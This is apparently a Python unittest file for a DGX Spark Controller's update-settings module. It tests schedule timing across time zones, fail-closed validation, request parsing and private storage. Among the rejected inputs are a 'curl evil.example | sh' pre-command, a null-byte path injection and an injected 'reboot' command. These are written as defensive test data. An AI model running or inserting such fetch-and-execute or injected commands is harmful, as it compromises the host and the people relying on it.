# SPDX-License-Identifier: Apache-2.0
# SPDX-FileCopyrightText: Copyright contributors to the DGX Spark Controller project

"""Update settings: fail-closed validation, private storage and the schedule."""

from __future__ import annotations

import json
import os
import stat
import tempfile
import time
import unittest
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

from controller.app import require_idempotency_key
from controller.updates.relay import RelaySource
from controller.updates.settings import (
    GRACE,
    SettingsError,
    SettingsStore,
    UpdateSettings,
    parse_request,
    slot_key,
)


class ScheduleTests(unittest.TestCase):
    """Slots are wall-clock times in the host zone; each zone runs these tests."""

    zone = "UTC"

    def setUp(self) -> None:
        previous = os.environ.get("TZ")
        os.environ["TZ"] = self.zone
        time.tzset()
        self.addCleanup(self.restore_zone, previous)

    @staticmethod
    def restore_zone(previous: str | None) -> None:
        if previous is None:
            os.environ.pop("TZ", None)
        else:
            os.environ["TZ"] = previous
        time.tzset()

    @staticmethod
    def local(year: int, month: int, day: int, hour: int, minute: int) -> datetime:
        return datetime(year, month, day, hour, minute).astimezone()

    def test_next_run_is_the_first_slot_strictly_after_now(self) -> None:
        settings = UpdateSettings(enabled=True, weekdays=("wed", "sun"))
        sunday = self.local(2026, 11, 1, 3, 0)

        self.assertEqual(sunday, settings.next_run(self.local(2026, 10, 29, 12, 0)))
        self.assertEqual(self.local(2026, 11, 4, 3, 0), settings.next_run(sunday))

    def test_slot_is_due_only_within_the_grace_period(self) -> None:
        settings = UpdateSettings(enabled=True)
        slot = self.local(2026, 11, 1, 3, 0)

        self.assertIsNone(settings.due_slot(slot - timedelta(minutes=1)))
        self.assertEqual(slot, settings.due_slot(slot))
        self.assertEqual(slot, settings.due_slot(slot + GRACE))
        self.assertIsNone(settings.due_slot(slot + GRACE + timedelta(seconds=1)))

    def test_slot_before_the_last_save_never_fires(self) -> None:
        slot = self.local(2026, 11, 1, 3, 0)

        def saved_at(moment: datetime) -> UpdateSettings:
            stamp = moment.astimezone(UTC).isoformat(timespec="milliseconds")
            return UpdateSettings(enabled=True, updated_at=stamp)

        later = slot + timedelta(minutes=20)
        self.assertIsNone(saved_at(slot + timedelta(minutes=10)).due_slot(later))
        self.assertEqual(slot, saved_at(slot - timedelta(minutes=10)).due_slot(later))

    def test_disabled_schedule_never_runs(self) -> None:
        settings = UpdateSettings(enabled=False)
        slot = self.local(2026, 11, 1, 3, 0)

        self.assertIsNone(settings.next_run(slot - timedelta(hours=1)))
        self.assertIsNone(settings.due_slot(slot))

    def test_slot_key_is_an_accepted_idempotency_key(self) -> None:
        slot = UpdateSettings(enabled=True).next_run(self.local(2026, 10, 29, 12, 0))
        assert slot is not None
        require_idempotency_key(slot_key(slot))


class BerlinScheduleTests(ScheduleTests):
    zone = "Europe/Berlin"

    def test_slot_keeps_its_wall_clock_time_across_a_dst_change(self) -> None:
        settings = UpdateSettings(enabled=True)
        summer = settings.next_run(self.local(2026, 10, 17, 12, 0))
        assert summer is not None
        winter = settings.next_run(summer)
        assert winter is not None

        self.assertEqual("scheduled-update-20261018T0100Z", slot_key(summer))
        self.assertEqual("scheduled-update-20261025T0200Z", slot_key(winter))
        self.assertEqual(timedelta(days=7, hours=1), winter - summer)


class LosAngelesScheduleTests(ScheduleTests):
    zone = "America/Los_Angeles"


class UpdateSettingsTests(unittest.TestCase):
    def assert_code(self, code: str, call: Any, *args: Any, **kwargs: Any) -> None:
        with self.assertRaises(SettingsError) as caught:
            call(*args, **kwargs)
        self.assertEqual(code, caught.exception.code)

    def test_from_dict_fails_closed_on_unknown_keys_and_versions(self) -> None:
        valid = UpdateSettings(enabled=True, weekdays=("mon", "thu")).to_dict()
        self.assertEqual(
            UpdateSettings(enabled=True, weekdays=("mon", "thu")),
            UpdateSettings.from_dict(valid),
        )
        for value in (
            {**valid, "pre_command": "curl evil.example | sh"},
            {**valid, "schema_version": 2},
            {key: item for key, item in valid.items() if key != "schema_version"},
        ):
            with self.subTest(value=value):
                self.assert_code(
                    "invalid_update_settings", UpdateSettings.from_dict, value
                )

    def test_from_dict_rejects_values_of_the_wrong_type(self) -> None:
        valid = UpdateSettings().to_dict()
        for change in (
            {"enabled": "true"},
            {"weekdays": "sun"},
            {"weekdays": [6]},
            {"time": 300},
            {"source": "directory", "directory": ["/srv/mirror"]},
        ):
            with self.subTest(change=change):
                self.assert_code(
                    "invalid_update_settings",
                    UpdateSettings.from_dict,
                    {**valid, **change},
                )

    def test_schedule_values_are_validated(self) -> None:
        for change in (
            {"weekdays": ()},
            {"weekdays": ("sun", "sun")},
            {"weekdays": ("sunday",)},
            {"time": "24:00"},
            {"time": "3:00"},
            {"time": "03:00\n"},
        ):
            with self.subTest(change=change):
                self.assert_code("invalid_schedule", UpdateSettings, **change)

    def test_directory_source_needs_exactly_a_directory(self) -> None:
        self.assert_code("invalid_update_source", UpdateSettings, source="directory")
        self.assert_code(
            "invalid_update_source", UpdateSettings, source="directory", directory=""
        )
        self.assert_code(
            "invalid_update_source", UpdateSettings, directory="/srv/mirror"
        )


class ParseRequestTests(unittest.TestCase):
    def setUp(self) -> None:
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.root = Path(temporary.name)

    def test_refuses_fields_the_browser_may_not_set(self) -> None:
        for body in (
            {"updated_at": "2000-01-01T00:00:00+00:00"},
            {"schema_version": 1},
            {"enabled": True, "command": "reboot"},
        ):
            with self.subTest(body=body), self.assertRaises(SettingsError) as caught:
                parse_request(body, UpdateSettings())
            self.assertEqual("invalid_request", caught.exception.code)

    def test_merges_over_current_settings_and_stamps_the_save(self) -> None:
        current = UpdateSettings(time="04:30")
        updated = parse_request({"enabled": True, "weekdays": ["sun", "mon"]}, current)

        self.assertEqual(
            (True, ("mon", "sun"), "04:30"),
            (updated.enabled, updated.weekdays, updated.time),
        )
        saved = datetime.fromisoformat(updated.updated_at)
        self.assertLess(abs(datetime.now(UTC) - saved), timedelta(minutes=1))

    def test_rejects_unknown_weekdays(self) -> None:
        for weekdays in (["mon", "funday"], [["mon"]], [1], "mon"):
            with (
                self.subTest(weekdays=weekdays),
                self.assertRaises(SettingsError) as caught,
            ):
                parse_request({"weekdays": weekdays}, UpdateSettings())
            self.assertEqual("invalid_schedule", caught.exception.code)

    def test_rejects_values_of_the_wrong_type(self) -> None:
        for body in (
            {"enabled": "yes"},
            {"time": 300},
            {"source": None},
        ):
            with self.subTest(body=body), self.assertRaises(SettingsError):
                parse_request(body, UpdateSettings())

    def test_directory_source_is_stored_resolved(self) -> None:
        mirror = self.root / "mirror"
        mirror.mkdir()
        (self.root / "link").symlink_to(mirror)

        updated = parse_request(
            {"source": "directory", "directory": str(self.root / "link")},
            UpdateSettings(),
        )
        self.assertEqual(
            RelaySource("directory", mirror.resolve()), updated.relay_source()
        )

    def test_directory_source_must_be_an_existing_absolute_directory(self) -> None:
        (self.root / "file").write_text("x")
        for directory in (
            None,
            "",
            "relative/mirror",
            str(self.root / "missing"),
            str(self.root / "file"),
            f"{self.root}\0/etc",
            "/" + "a" * 1100,
        ):
            with (
                self.subTest(directory=directory),
                self.assertRaises(SettingsError) as caught,
            ):
                parse_request(
                    {"source": "directory", "directory": directory}, UpdateSettings()
                )
            self.assertEqual("invalid_update_source", caught.exception.code)


class SettingsStoreTests(unittest.TestCase):
    def setUp(self) -> None:
        temporary = tempfile.TemporaryDirectory()
        self.addCleanup(temporary.cleanup)
        self.path = Path(temporary.name) / "data" / "update-settings.json"

    def test_missing_file_loads_the_disabled_defaults(self) -> None:
        self.assertEqual(UpdateSettings(), SettingsStore(self.path).load())

    def test_save_round_trips_into_a_private_file(self) -> None:
        settings = UpdateSettings(
            enabled=True, weekdays=("sat",), updated_at="2026-10-29T12:00:00+00:00"
        )
        SettingsStore(self.path).save(settings)

        self.assertEqual(settings, SettingsStore(self.path).load())
        self.assertEqual(0o600, stat.S_IMODE(self.path.stat().st_mode))

    def test_malformed_file_fails_closed(self) -> None:
        self.path.parent.mkdir()
        unknown = {**UpdateSettings().to_dict(), "extra": True}
        for text in ("{not json", "[]", json.dumps(unknown)):
            with self.subTest(text=text), self.assertRaises(SettingsError) as caught:
                self.path.write_text(text)
                SettingsStore(self.path).load()
            self.assertEqual("invalid_update_settings", caught.exception.code)


if __name__ == "__main__":
    unittest.main()
